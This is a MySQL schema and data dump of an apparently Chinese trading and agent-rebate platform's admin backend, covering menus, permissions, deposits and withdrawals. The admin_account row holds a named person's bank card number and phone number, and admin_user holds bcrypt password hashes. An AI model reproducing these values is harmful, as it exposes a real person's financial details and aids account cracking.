/*
Navicat MySQL Data Transfer

Source Server         : localhost
Source Server Version : 50617
Source Host           : localhost:3306
Source Database       : x57

Target Server Type    : MYSQL
Target Server Version : 50617
File Encoding         : 65001

Date: 2017-09-28 11:36:32
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for address
-- ----------------------------
DROP TABLE IF EXISTS `address`;
CREATE TABLE `address` (
  `id` tinyint(4) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `user_id` int(6) DEFAULT NULL COMMENT '用户id',
  `addr` varchar(60) DEFAULT NULL COMMENT '地址',
  `default` tinyint(1) DEFAULT NULL COMMENT '是否默认;1:默认;2;备用',
  `phone` varchar(11) DEFAULT '' COMMENT '手机号',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='用户地址';

-- ----------------------------
-- Records of address
-- ----------------------------
INSERT INTO `address` VALUES ('7', '100001', '上海市普陀区金沙江路1145号', '1', '12345');

-- ----------------------------
-- Table structure for admin_account
-- ----------------------------
DROP TABLE IF EXISTS `admin_account`;
CREATE TABLE `admin_account` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `admin_id` int(11) NOT NULL COMMENT '用户ID',
  `realname` varchar(100) NOT NULL COMMENT '真实姓名',
  `id_card` varchar(100) NOT NULL COMMENT '身份证号',
  `bank_name` varchar(100) NOT NULL COMMENT '银行名称',
  `bank_card` varchar(100) NOT NULL COMMENT '银行卡号',
  `bank_user` varchar(100) NOT NULL COMMENT '持卡人姓名',
  `bank_mobile` char(11) NOT NULL COMMENT '银行预留手机号',
  `bank_type` varchar(100) NOT NULL COMMENT '联行号',
  `bank_areacode` varchar(50) NOT NULL COMMENT '地区码',
  `bank_code` varchar(50) DEFAULT NULL COMMENT '银行编码',
  `bank_address` varchar(100) DEFAULT '' COMMENT '开户行地址',
  `province` varchar(100) NOT NULL COMMENT '省份',
  `city` varchar(100) NOT NULL COMMENT '城市',
  `address` varchar(150) DEFAULT '' COMMENT '地址',
  `created_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `admin_id` (`admin_id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8 COMMENT='后台用户账户表';

-- ----------------------------
-- Records of admin_account
-- ----------------------------
INSERT INTO `admin_account` VALUES ('19', '4', '任宏', '1', '102', '6228480408625634675', '任宏', '15851408673', '', '', '中国工商银行', '1', '', '', '', '2017-08-14 15:38:24');

-- ----------------------------
-- Table structure for admin_deposit
-- ----------------------------
DROP TABLE IF EXISTS `admin_deposit`;
CREATE TABLE `admin_deposit` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL COMMENT '订单id',
  `user_id` int(11) DEFAULT '0' COMMENT '头寸用户',
  `admin_id` int(11) NOT NULL COMMENT '账号',
  `amount` decimal(11,2) NOT NULL DEFAULT '0.00' COMMENT '金额',
  `created_at` datetime DEFAULT NULL COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='管理员保证金记录表';

-- ----------------------------
-- Records of admin_deposit
-- ----------------------------
INSERT INTO `admin_deposit` VALUES ('1', '1', '100001', '10', '8.50', '2017-08-15 17:54:17');
INSERT INTO `admin_deposit` VALUES ('2', '2', '100001', '10', '-8.50', '2017-08-15 18:03:53');

-- ----------------------------
-- Table structure for admin_leader
-- ----------------------------
DROP TABLE IF EXISTS `admin_leader`;
CREATE TABLE `admin_leader` (
  `admin_id` int(11) NOT NULL,
  `mobile` char(11) DEFAULT '' COMMENT '手机号',
  `point` tinyint(3) DEFAULT '0' COMMENT '返点百分比%',
  `deposit` decimal(13,2) DEFAULT '0.00' COMMENT '保证金',
  `state` tinyint(4) DEFAULT '1',
  `created_at` datetime DEFAULT NULL,
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`admin_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='综会表';

-- ----------------------------
-- Records of admin_leader
-- ----------------------------
INSERT INTO `admin_leader` VALUES ('2', '99999999999', '100', '0.00', '1', '2017-05-19 15:29:35', '2', '2017-05-20 10:43:39', '100001');
INSERT INTO `admin_leader` VALUES ('3', '13900000000', '80', '0.00', '1', '2017-05-19 15:29:35', '2', '2017-05-20 10:43:39', '100001');
INSERT INTO `admin_leader` VALUES ('7', '132', '80', '100.00', '1', '2017-08-15 16:46:06', '1', '2017-08-15 17:37:32', '1');
INSERT INTO `admin_leader` VALUES ('8', '130', '80', '300.00', '1', '2017-08-15 16:50:13', '1', '2017-08-15 17:37:28', '1');
INSERT INTO `admin_leader` VALUES ('10', '136', '80', '108.50', '1', '2017-08-15 16:53:34', '1', '2017-08-15 18:03:53', '0');
INSERT INTO `admin_leader` VALUES ('11', '156', '80', '100.00', '1', '2017-08-15 16:55:55', '1', '2017-08-15 17:34:30', '1');

-- ----------------------------
-- Table structure for admin_menu
-- ----------------------------
DROP TABLE IF EXISTS `admin_menu`;
CREATE TABLE `admin_menu` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '序号',
  `name` varchar(30) NOT NULL COMMENT '菜单名',
  `pid` int(11) DEFAULT '0' COMMENT '父ID',
  `level` smallint(6) DEFAULT '1' COMMENT '层级',
  `sort` int(11) DEFAULT '1' COMMENT '排序值',
  `url` varchar(250) DEFAULT '' COMMENT '跳转链接',
  `icon` varchar(250) DEFAULT NULL COMMENT '图标',
  `is_show` tinyint(4) DEFAULT '1' COMMENT '是否显示',
  `category` tinyint(4) DEFAULT '1' COMMENT '菜单分类',
  `state` tinyint(4) DEFAULT '1' COMMENT '状态',
  `created_at` datetime DEFAULT NULL,
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=45 DEFAULT CHARSET=utf8 COMMENT='菜单表';

-- ----------------------------
-- Records of admin_menu
-- ----------------------------
INSERT INTO `admin_menu` VALUES ('1', '系统管理', '0', '1', '1', 'system', '<i class=\"Hui-iconfont\">&#xe62e;</i>', '1', '1', '1', '2016-08-22 17:54:31', '1', '2016-10-28 15:03:56', '1');
INSERT INTO `admin_menu` VALUES ('2', '系统设置', '1', '2', '1', 'system/setting', '', '1', '1', '1', '2016-08-22 17:54:58', '1', '2016-08-22 17:54:58', '1');
INSERT INTO `admin_menu` VALUES ('3', '系统菜单', '1', '2', '2', 'system/menu', '', '1', '1', '1', '2016-08-22 17:55:35', '1', '2016-08-22 18:59:43', '1');
INSERT INTO `admin_menu` VALUES ('4', '系统日志', '1', '2', '3', 'system/logList', '', '1', '1', '1', '2016-08-22 18:42:11', '1', '2016-09-02 11:40:45', '1');
INSERT INTO `admin_menu` VALUES ('5', '管理员管理', '0', '1', '2', 'admin', '<i class=\"Hui-iconfont\">&#xe62d;</i>', '1', '1', '1', '2016-08-22 18:43:29', '1', '2016-10-28 15:03:56', '1');
INSERT INTO `admin_menu` VALUES ('6', '管理员列表', '5', '2', '1', 'admin/list', '', '1', '1', '1', '2016-08-22 18:46:24', '1', '2016-08-22 18:46:24', '1');
INSERT INTO `admin_menu` VALUES ('7', '角色列表', '5', '2', '2', 'admin/roleList', '', '1', '1', '1', '2016-08-22 18:46:50', '1', '2016-08-30 18:25:01', '1');
INSERT INTO `admin_menu` VALUES ('8', '权限列表', '5', '2', '3', 'admin/permissionList', '', '1', '1', '1', '2016-08-22 18:47:10', '1', '2016-08-30 18:24:58', '1');
INSERT INTO `admin_menu` VALUES ('9', '会员管理', '0', '1', '3', 'user', '<i class=\"Hui-iconfont\">&#xe60d;</i>', '1', '1', '1', '2016-08-22 18:47:49', '1', '2016-10-28 15:03:56', '1');
INSERT INTO `admin_menu` VALUES ('10', '会员列表', '9', '2', '1', 'user/list', '', '1', '1', '1', '2016-08-22 18:48:13', '1', '2016-08-27 19:45:26', '1');
INSERT INTO `admin_menu` VALUES ('11', '代理商管理', '0', '1', '7', 'retail', '<i class=\"Hui-iconfont\">&#xe616;</i>', '1', '1', '1', '2016-08-22 18:48:55', '1', '2016-11-28 16:49:41', '1');
INSERT INTO `admin_menu` VALUES ('12', '代理商列表', '11', '2', '2', 'retail/list', '', '1', '1', '1', '2016-08-22 18:49:15', '1', '2016-11-28 16:49:54', '1');
INSERT INTO `admin_menu` VALUES ('13', '体验券管理', '0', '1', '6', 'coupon', '<i class=\"Hui-iconfont\">&#xe613;</i>', '1', '1', '1', '2016-08-22 18:49:39', '1', '2016-10-28 15:07:00', '1');
INSERT INTO `admin_menu` VALUES ('14', '体验券列表', '13', '2', '1', 'coupon/list', '', '1', '1', '1', '2016-08-22 18:49:54', '1', '2016-10-28 15:07:04', '1');
INSERT INTO `admin_menu` VALUES ('15', '产品管理', '0', '1', '5', 'product', '<i class=\"Hui-iconfont\">&#xe620;</i>', '1', '1', '1', '2016-08-22 18:51:04', '1', '2016-10-28 15:03:56', '1');
INSERT INTO `admin_menu` VALUES ('16', '产品列表', '15', '2', '1', 'product/list', '', '1', '1', '1', '2016-08-22 18:51:18', '1', '2016-08-22 18:51:18', '1');
INSERT INTO `admin_menu` VALUES ('17', '分销管理', '0', '1', '6', 'sale', '<i class=\"Hui-iconfont\">&#xe622;</i>', '1', '1', '-1', '2016-08-22 18:51:35', '1', '2016-10-28 15:03:56', '1');
INSERT INTO `admin_menu` VALUES ('18', '经纪人列表', '17', '2', '2', 'sale/managerList', '', '1', '1', '-1', '2016-08-22 18:52:10', '1', '2016-10-28 15:48:01', '1');
INSERT INTO `admin_menu` VALUES ('19', '订单管理', '0', '1', '4', 'order', '<i class=\"Hui-iconfont\">&#xe61a;</i>', '1', '1', '1', '2016-08-22 19:00:05', '1', '2016-10-28 15:03:56', '1');
INSERT INTO `admin_menu` VALUES ('20', '用户持有体验券', '13', '2', '2', 'coupon/ownerList', '', '1', '1', '1', '2016-10-27 14:50:18', '1', '2016-10-28 15:27:50', '1');
INSERT INTO `admin_menu` VALUES ('21', '会员持仓列表', '9', '2', '2', 'user/positionList', '', '1', '1', '1', '2016-10-27 15:32:31', '1', '2016-10-28 09:27:38', '1');
INSERT INTO `admin_menu` VALUES ('22', '会员赠金', '9', '2', '3', 'user/giveList', '', '1', '1', '1', '2016-10-27 15:33:45', '1', '2016-10-27 19:55:55', '1');
INSERT INTO `admin_menu` VALUES ('23', '会员出金', '9', '2', '4', 'user/withdrawList', '', '1', '1', '1', '2016-10-27 15:34:11', '1', '2016-10-27 19:55:59', '1');
INSERT INTO `admin_menu` VALUES ('24', '会员充值记录', '9', '2', '5', 'user/chargeRecordList', '', '1', '1', '1', '2016-10-27 15:36:04', '1', '2016-10-27 19:56:07', '1');
INSERT INTO `admin_menu` VALUES ('25', '订单列表', '19', '2', '1', 'order/list', '', '1', '1', '1', '2016-10-27 21:10:41', '1', '2016-10-27 21:10:41', '1');
INSERT INTO `admin_menu` VALUES ('26', '风险管理', '0', '1', '8', 'risk', '<i class=\"Hui-iconfont\">&#xe65a;</i>', '1', '1', '1', '2016-10-29 10:45:01', '1', '2016-10-29 10:50:36', '1');
INSERT INTO `admin_menu` VALUES ('27', '风险控制', '26', '2', '1', 'risk/center', '', '1', '1', '1', '2016-10-29 10:45:37', '1', '2016-10-29 10:45:37', '1');
INSERT INTO `admin_menu` VALUES ('28', '审核经纪人', '9', '2', '7', 'user/verifyManager', '', '1', '1', '-1', '2016-10-31 17:06:34', '1', '2016-10-31 17:06:34', '1');
INSERT INTO `admin_menu` VALUES ('29', '经纪人列表', '11', '2', '3', 'sale/managerList', '', '1', '1', '1', '2016-11-30 18:00:01', '1', '2016-11-30 18:00:01', '1');
INSERT INTO `admin_menu` VALUES ('30', '审核经纪人', '11', '2', '4', 'user/verifyManager', '', '1', '1', '1', '2016-11-30 18:00:25', '1', '2016-11-30 18:00:25', '1');
INSERT INTO `admin_menu` VALUES ('31', '管理员返点记录列表', '11', '2', '5', 'sale/managerRebateList', '', '1', '1', '1', '2016-12-06 15:50:40', '1', '2017-05-19 18:45:34', '1');
INSERT INTO `admin_menu` VALUES ('32', '经纪人返点记录列表', '11', '2', '6', 'user/rebateList', '', '1', '1', '1', '2016-12-06 15:51:19', '1', '2017-05-19 18:45:18', '1');
INSERT INTO `admin_menu` VALUES ('33', '代理商出金记录', '11', '2', '7', 'retail/withdrawList', '', '1', '1', '1', '2017-04-10 14:08:34', '1', '2017-04-10 14:08:34', '1');
INSERT INTO `admin_menu` VALUES ('34', '综会列表', '11', '2', '1', 'admin/leaderList', '', '1', '1', '1', '2017-05-19 15:18:09', '1', '2017-05-19 15:18:09', '1');
INSERT INTO `admin_menu` VALUES ('35', '用户头寸统计记录', '11', '2', '8', 'record/depositList', '', '1', '1', '1', '2017-05-20 10:49:44', '1', '2017-05-20 10:49:44', '1');
INSERT INTO `admin_menu` VALUES ('36', '商城商品列表', '15', '2', '2', 'shop/list', '', '1', '1', '1', '2017-06-20 14:57:18', '1', '2017-06-20 14:57:18', '1');
INSERT INTO `admin_menu` VALUES ('37', '返利商品列表', '15', '2', '3', 'shop/prizeList', '', '1', '1', '1', '2017-06-20 18:11:14', '1', '2017-06-20 18:11:14', '1');
INSERT INTO `admin_menu` VALUES ('38', '积分商品列表', '15', '2', '4', 'shop/inteList', '', '1', '1', '1', '2017-06-21 11:32:45', '1', '2017-06-21 11:32:45', '1');
INSERT INTO `admin_menu` VALUES ('39', '会员积分列表', '9', '2', '8', 'user/userIntelist', '', '1', '1', '1', '2017-06-22 18:26:27', '1', '2017-06-22 18:26:27', '1');
INSERT INTO `admin_menu` VALUES ('40', '会员商城订单列表', '9', '2', '9', 'shop/orderList', '', '1', '1', '1', '2017-06-23 10:05:05', '1', '2017-06-23 10:05:05', '1');
INSERT INTO `admin_menu` VALUES ('41', '手续费提现', '9', '2', '10', 'user/adminWithdraw', '', '1', '1', '1', '2017-08-14 15:12:34', '1', '2017-08-14 15:12:34', '1');
INSERT INTO `admin_menu` VALUES ('42', '手续费出金', '9', '2', '11', 'user/adminsWithdrawList', '', '1', '1', '1', '2017-08-14 15:12:49', '1', '2017-08-14 15:12:49', '1');
INSERT INTO `admin_menu` VALUES ('43', '人工风险', '26', '2', '2', 'risk/control', '', '1', '1', '1', '2017-08-24 09:47:40', '1', '2017-08-24 09:47:40', '1');
INSERT INTO `admin_menu` VALUES ('44', '赠金记录', '9', '2', '12', 'user/giveMoneyList', '', '1', '1', '1', '2017-08-25 16:49:55', '1', '2017-08-25 16:49:55', '1');

-- ----------------------------
-- Table structure for admin_user
-- ----------------------------
DROP TABLE IF EXISTS `admin_user`;
CREATE TABLE `admin_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL COMMENT '账号',
  `password` varchar(80) NOT NULL COMMENT '密码',
  `realname` varchar(30) NOT NULL DEFAULT '' COMMENT '真名',
  `pid` int(11) DEFAULT '0' COMMENT '上级',
  `power` int(11) DEFAULT '10000' COMMENT '权力值',
  `state` tinyint(4) DEFAULT '1' COMMENT '状态',
  `created_at` datetime DEFAULT NULL,
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL,
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='后台用户表';

-- ----------------------------
-- Records of admin_user
-- ----------------------------
INSERT INTO `admin_user` VALUES ('1', 'ChisWill', '$2y$13$NyildiAukB0CCBj4m0Xi5euEgcaAHFKFdr4lRYe41.2S6YFCJmlGq', 'ChisWill', '0', '10000', '1', '2016-08-06 23:36:12', '0', '2016-08-31 11:41:15', '1');
INSERT INTO `admin_user` VALUES ('2', 'admin', '$2y$13$YpUPtfQjhqjg82jhXWL2YOcCxDmo7aBJNvcrcZ2StfTvQ2TXBJF9i', 'admin', '0', '9999', '1', '2016-10-26 17:41:00', '1', '2017-08-24 14:28:56', '2');
INSERT INTO `admin_user` VALUES ('3', '综会001', '$2y$13$FrX47.U1Gpae0y6hUrnyFOTGlRfV4wbWHKWHDYDpR7Bl14c7zXAFq', '综会', '2', '9998', '1', '2017-05-19 15:29:35', '1', '2017-05-19 15:29:35', '1');
INSERT INTO `admin_user` VALUES ('4', '代理商001', '$2y$13$NyildiAukB0CCBj4m0Xi5euEgcaAHFKFdr4lRYe41.2S6YFCJmlGq', '代理商001', '10', '9997', '1', '2017-05-19 15:44:16', '1', '2017-05-19 15:44:16', '1');
INSERT INTO `admin_user` VALUES ('7', '综会004', '$2y$13$xKTmvGwq6Z.am8tNmSNVpOdUUjZoadQ/gixAUVTTei1507eAOBi1i', '1', '2', '9998', '1', '2017-08-15 16:46:06', '1', '2017-08-15 16:46:06', '1');
INSERT INTO `admin_user` VALUES ('8', '会05', '$2y$13$CtuwlzYOjZcnzLk9ot9PM.up0ldATalu7zkq5C6G1borVpnrNQMKi', '会05', '2', '9998', '1', '2017-08-15 16:50:13', '1', '2017-08-15 16:50:13', '1');
INSERT INTO `admin_user` VALUES ('9', '会06', '$2y$13$hIYz957itARmAHXDhh6Cbe85.ogTPrTZlTK/RFNQcqZu1gHQAt0wK', '会06', '2', '9999', '1', '2017-08-15 16:51:14', '1', '2017-08-15 16:51:14', '1');
INSERT INTO `admin_user` VALUES ('10', '会07', '$2y$13$U2iS4oo/SDaAotJAa0l7IOAjQmVNWZMdcIjwykNiKAI94MclhBt3C', '会07', '2', '9998', '1', '2017-08-15 16:53:34', '1', '2017-08-15 16:53:34', '1');
INSERT INTO `admin_user` VALUES ('11', '会08', '$2y$13$/lVmHVUIxB.5cnFOsXc7WetuU.tls5t6LJmjzqKX6x8uT4EG9SNZG', '会08', '2', '9998', '1', '2017-08-15 16:55:55', '1', '2017-08-15 16:55:55', '1');

-- ----------------------------
-- Table structure for admin_withdraw
-- ----------------------------
DROP TABLE IF EXISTS `admin_withdraw`;
CREATE TABLE `admin_withdraw` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `admin_id` int(11) NOT NULL COMMENT '用户ID',
  `amount` decimal(11,2) NOT NULL COMMENT '出金金额',
  `op_state` tinyint(4) DEFAULT '1' COMMENT '操作状态：1待审核，2已操作，-1不通过',
  `created_at` datetime DEFAULT NULL COMMENT '申请时间',
  `created_by` int(11) DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL COMMENT '审核时间',
  `updated_by` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `admin_id` (`admin_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='管理员提款表';

-- ----------------------------
-- Records of admin_withdraw
-- ----------------------------

-- ----------------------------
-- Table structure for article
-- ----------------------------
DROP TABLE IF EXISTS `article`;
CREATE TABLE `article` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL COMMENT '标题',
  `content` text NOT NULL COMMENT '内容',
  `publish_time` datetime NOT NULL COMMENT '发生时间',
  `category` tinyint(4) DEFAULT '1' COMMENT '分类',
  `state` tinyint(4) DEFAULT '1' COMMENT '状态',
  `created_at` datetime DEFAULT NULL COMMENT '发布时间',
  `created_by` int(11) DEFAULT NULL COMMENT '发布人',
  `updated_at` datetime DEFAULT NULL COMMENT '更新时间',
  `updated_by` int(11) DEFAULT NULL COMMENT '修改人',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='资讯表';

-- ----------------------------
-- Records of article
-- ----------------------------

-- ----------------------------
-- Table structure for auth_assignment
-- ----------------------------
DROP TABLE IF EXISTS `auth_assignment`;
CREATE TABLE `auth_assignment` (
  `item_name` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` int(11) DEFAULT NULL,
  PRIMARY KEY (`item_name`,`user_id`),
  CONSTRAINT `auth_assignment_ibfk_1` FOREIGN KEY (`item_name`) REFERENCES `auth_item` (`name`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of auth_assignment
-- ----------------------------
INSERT INTO `auth_assignment` VALUES ('代理商管理', '10', '1502787215');
INSERT INTO `auth_assignment` VALUES ('代理商管理', '11', '1502787356');
INSERT INTO `auth_assignment` VALUES ('代理商管理', '4', '1495179857');
INSERT INTO `auth_assignment` VALUES ('代理商管理', '5', '1502786167');
INSERT INTO `auth_assignment` VALUES ('代理商管理', '6', '1502786582');
INSERT INTO `auth_assignment` VALUES ('代理商管理', '7', '1502786767');
INSERT INTO `auth_assignment` VALUES ('代理商管理', '8', '1502787014');
INSERT INTO `auth_assignment` VALUES ('代理商管理', '9', '1502787074');
INSERT INTO `auth_assignment` VALUES ('综会管理', '3', '1495178976');
INSERT INTO `auth_assignment` VALUES ('超级管理员', '2', '1472551696');

-- ----------------------------
-- Table structure for auth_item
-- ----------------------------
DROP TABLE IF EXISTS `auth_item`;
CREATE TABLE `auth_item` (
  `name` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `type` int(11) NOT NULL,
  `description` text COLLATE utf8_unicode_ci,
  `rule_name` varchar(64) COLLATE utf8_unicode_ci DEFAULT NULL,
  `data` text COLLATE utf8_unicode_ci,
  `created_at` int(11) DEFAULT NULL,
  `updated_at` int(11) DEFAULT NULL,
  PRIMARY KEY (`name`),
  KEY `rule_name` (`rule_name`),
  KEY `idx-auth_item-type` (`type`),
  CONSTRAINT `auth_item_ibfk_1` FOREIGN KEY (`rule_name`) REFERENCES `auth_rule` (`name`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of auth_item
-- ----------------------------
INSERT INTO `auth_item` VALUES ('frontendAdminAddPermission', '2', '添加权限', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendAdminAjaxDeleteAdmin', '2', '删除管理员', null, null, '1477473346', '1477473346');
INSERT INTO `auth_item` VALUES ('frontendAdminAjaxDeleteRole', '2', '删除角色', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendAdminAjaxRoleInfo', '2', '查看角色权限', null, null, '1472543566', '1472543566');
INSERT INTO `auth_item` VALUES ('frontendAdminAjaxUpdatePermission', '2', '修改权限', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendAdminCreateRole', '2', '创建角色', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendAdminEditPoint', '2', '修改综会返点%', null, null, '1495192221', '1495192221');
INSERT INTO `auth_item` VALUES ('frontendAdminEditRole', '2', '编辑角色', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendAdminLeaderList', '2', '综会列表', null, null, '1495192221', '1495192221');
INSERT INTO `auth_item` VALUES ('frontendAdminList', '2', '管理员列表', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendAdminPermissionList', '2', '权限列表', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendAdminRoleList', '2', '角色列表', null, null, '1472525853', '1472525853');
INSERT INTO `auth_item` VALUES ('frontendAdminSaveAdmin', '2', '创建/修改管理员', null, null, '1477473346', '1477473346');
INSERT INTO `auth_item` VALUES ('frontendAdminSaveLeader', '2', '创建/修改综会', null, null, '1495192221', '1495192221');
INSERT INTO `auth_item` VALUES ('frontendArticleDeleteArticle', '2', '删除资讯', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendArticleList', '2', '资讯列表', null, null, '1472720497', '1472723714');
INSERT INTO `auth_item` VALUES ('frontendArticleSaveArticle', '2', '添加/编辑资讯', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendCouponCreateCoupon', '2', '添加体验券', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendCouponList', '2', '体验券列表', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendCouponOwnerList', '2', '会员体验券列表', null, null, '1477837454', '1477837512');
INSERT INTO `auth_item` VALUES ('frontendOrderList', '2', '订单列表', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendOrderOrderExcel', '2', '订单信息导出', null, null, '1491882588', '1491882588');
INSERT INTO `auth_item` VALUES ('frontendOrderSellOrder', '2', '手动平仓', null, null, '1480586668', '1480586668');
INSERT INTO `auth_item` VALUES ('frontendOrderToday', '2', '今日订单', null, null, '1503539198', '1503539198');
INSERT INTO `auth_item` VALUES ('frontendProductAddProduct', '2', '添加特殊产品', null, null, '1495192221', '1495192221');
INSERT INTO `auth_item` VALUES ('frontendProductAddStock', '2', '添加股票', null, null, '1480586668', '1480586668');
INSERT INTO `auth_item` VALUES ('frontendProductAjaxAllDown', '2', '一键下架产品', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendProductAjaxAllUp', '2', '一键上架产品', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendProductDeletePrice', '2', '删除产品价格', null, null, '1477837454', '1477837504');
INSERT INTO `auth_item` VALUES ('frontendProductEditPoint', '2', '修改产品浮动点位', null, null, '1495192221', '1495192221');
INSERT INTO `auth_item` VALUES ('frontendProductFloatList', '2', '产品浮动列表', null, null, '1495192221', '1495192221');
INSERT INTO `auth_item` VALUES ('frontendProductList', '2', '产品列表', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendProductSetTradePrice', '2', '设置交易价格', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendProductSetTradeTime', '2', '设置交易时间', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendRecordAddRingWechat', '2', '创建微会员公众号', null, null, '1495248674', '1495248674');
INSERT INTO `auth_item` VALUES ('frontendRecordDepositList', '2', '用户头寸统计记录', null, null, '1495248674', '1495248674');
INSERT INTO `auth_item` VALUES ('frontendRecordDepositRecord', '2', '保证金操作记录', null, null, '1495248674', '1495248674');
INSERT INTO `auth_item` VALUES ('frontendRecordFeeRecord', '2', '手续费提现记录', null, null, '1495248674', '1495248674');
INSERT INTO `auth_item` VALUES ('frontendRecordNewsWechat', '2', '公众号消息列表', null, null, '1495248674', '1495248674');
INSERT INTO `auth_item` VALUES ('frontendRecordRingWechatList', '2', '微会员公众号记录', null, null, '1495248674', '1495248674');
INSERT INTO `auth_item` VALUES ('frontendRecordSaveNewsWechat', '2', '添加/编辑公众号消息', null, null, '1495248674', '1495248674');
INSERT INTO `auth_item` VALUES ('frontendRecordSendMessage', '2', '推送微信图文消息', null, null, '1495248674', '1495248674');
INSERT INTO `auth_item` VALUES ('frontendRetailEditPoint', '2', '修改代理商返点%', null, null, '1495192221', '1495192221');
INSERT INTO `auth_item` VALUES ('frontendRetailList', '2', '代理商列表', null, null, '1480586668', '1480586668');
INSERT INTO `auth_item` VALUES ('frontendRetailSaveRetail', '2', '添加/编辑会员单位', null, null, '1480586668', '1480586668');
INSERT INTO `auth_item` VALUES ('frontendRetailSaveWithdraw', '2', '添加/编辑代理商出金', null, null, '1491814259', '1491814259');
INSERT INTO `auth_item` VALUES ('frontendRetailVerifyWithdraw', '2', '代理商出金操作', null, null, '1491814259', '1491814259');
INSERT INTO `auth_item` VALUES ('frontendRetailWithdrawList', '2', '代理商出金列表', null, null, '1491814259', '1491814259');
INSERT INTO `auth_item` VALUES ('frontendRiskCenter', '2', '风险控制', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendRiskControl', '2', '风险控制', null, null, '1503539198', '1503539198');
INSERT INTO `auth_item` VALUES ('frontendRiskOrderInfo', '2', '实时下单信息', null, null, '1503539198', '1503539198');
INSERT INTO `auth_item` VALUES ('frontendSaleEditPoint', '2', '修改经纪人返点%', null, null, '1480586668', '1480586668');
INSERT INTO `auth_item` VALUES ('frontendSaleManagerList', '2', '经纪人列表', null, null, '1477837454', '1477837454');
INSERT INTO `auth_item` VALUES ('frontendSaleManagerRebateList', '2', '代理商返点统计', null, null, '1481010977', '1481010977');
INSERT INTO `auth_item` VALUES ('frontendShopEditInte', '2', '添加积分商品', null, null, '1498033601', '1498033601');
INSERT INTO `auth_item` VALUES ('frontendShopEditPrize', '2', '添加返利商品', null, null, '1498033601', '1498033601');
INSERT INTO `auth_item` VALUES ('frontendShopEditShop', '2', '添加商城商品', null, null, '1498033600', '1498033600');
INSERT INTO `auth_item` VALUES ('frontendShopInteList', '2', '积分商品列表', null, null, '1498033601', '1498033601');
INSERT INTO `auth_item` VALUES ('frontendShopList', '2', '商城商品列表', null, null, '1498033600', '1498033600');
INSERT INTO `auth_item` VALUES ('frontendShopOrderList', '2', '商城订单列表', null, null, '1502695202', '1502695202');
INSERT INTO `auth_item` VALUES ('frontendShopPrizeList', '2', '返利商品列表', null, null, '1498033601', '1498033601');
INSERT INTO `auth_item` VALUES ('frontendShopSuccessOrder', '2', '商品订单确认收货', null, null, '1502695203', '1502695203');
INSERT INTO `auth_item` VALUES ('frontendShopUpdateOrder', '2', '商品订单操作', null, null, '1502695203', '1502695203');
INSERT INTO `auth_item` VALUES ('frontendSystemAddSetting', '2', '添加系统设置', null, null, '1472720497', '1472720497');
INSERT INTO `auth_item` VALUES ('frontendSystemDeleteSetting', '2', '删除系统设置', null, null, '1472720497', '1472720497');
